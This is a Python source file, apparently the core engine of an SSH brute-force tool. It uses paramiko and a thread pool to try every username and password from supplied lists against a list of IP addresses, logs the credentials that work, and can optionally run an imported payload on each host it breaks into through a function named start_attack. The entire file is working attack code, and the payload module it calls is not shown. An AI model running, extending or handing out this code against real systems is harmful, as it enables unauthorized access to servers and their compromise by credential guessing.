# core/ssh_engine.py
import paramiko
import socket
from concurrent.futures import ThreadPoolExecutor
from utils.logger import log_success, log_failure
from core.payloads import execute_payload

def try_ssh(ip, port, username, password, timeout=5, os_type="linux", payload=False):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password, timeout=timeout, allow_agent=False, look_for_keys=False)
        log_success(ip, username, password)
        if payload:
            execute_payload(client, os_type)
        client.close()
        return True
    except paramiko.AuthenticationException:
        log_failure(ip, username, password)
    except (socket.error, paramiko.SSHException):
        log_failure(ip, username, password)
    return False

def start_attack(ip_list, user_list, pass_list, port, threads, os_type, payload=False):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for ip in ip_list:
            for user in user_list:
                for passwd in pass_list:
                    executor.submit(try_ssh, ip, port, user, passwd, 5, os_type, payload)
